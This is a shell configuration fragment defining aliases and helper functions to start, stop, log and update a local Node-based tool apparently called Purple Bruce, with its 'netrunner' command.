# ── Purple Bruce server ──────────────────────────────────────────
_nr() { command netrunner "$@" 2>/dev/null || echo "[⚠] netrunner not found — run install-arch.sh first"; }
alias pb='_nr'
alias lucy='_nr'
alias purple='_nr'
alias bruce='_nr'
alias doctor='_nr doctor'
alias deck='_nr deck'
alias team='_nr team'
alias overclock='_nr overclock'
alias scan='_nr scan'

_pb_start() {
  local dir="${HOME}/purplebruce"
  [[ -d "$dir" ]] || { echo "[✘] ~/purplebruce not found"; return 1; }
  mkdir -p "${HOME}/.purplebruce"
  if command -v netrunner >/dev/null 2>&1; then
    netrunner start
  elif command -v tmux >/dev/null 2>&1; then
    tmux new-session -d -s purplebruce -x 220 -y 50 2>/dev/null || true
    tmux send-keys -t purplebruce "cd ${dir} && node server.js 2>&1 | tee ~/.purplebruce/server.log" Enter
    echo "[✔] Server started in tmux → http://127.0.0.1:3000"
    echo "    tmux attach -t purplebruce"
  else
    cd "$dir" && node server.js &
    echo "[✔] Server started → http://127.0.0.1:3000"
  fi
}
alias pbstart='_pb_start'
alias go='_pb_start'
alias pbstop='pkill -f "node server.js" 2>/dev/null && echo "[✔] Stopped." || echo "[⚠] Not running."'
alias stop='pkill -f "node server.js" 2>/dev/null && echo "[✔] Stopped." || echo "[⚠] Not running."'
alias pbrestart='pkill -f "node server.js" 2>/dev/null; sleep 1; _pb_start'
alias logs='tail -f ~/.purplebruce/audit.log 2>/dev/null || tail -f ~/purplebruce/server.log 2>/dev/null || echo "[⚠] No log — run: pbstart"'

# ── Update ───────────────────────────────────────────────────────
_pb_update() {
  local dir="${HOME}/purplebruce"
  [[ -d "$dir" ]] || { echo "[✘] ~/purplebruce not found"; return 1; }
  echo "[→] Pulling latest..."
  git -C "$dir" pull origin main || { echo "[⚠] git pull failed"; return 1; }
  echo "[→] npm install..."
  npm install --prefix "$dir" --silent
  echo "[→] Deploying dotfiles..."
  bash "${dir}/netrunner/dotfiles/install.sh"
  echo "[✔] Done — run: exec zsh"
}
alias pbupdate='_pb_update'
alias update='_pb_update'

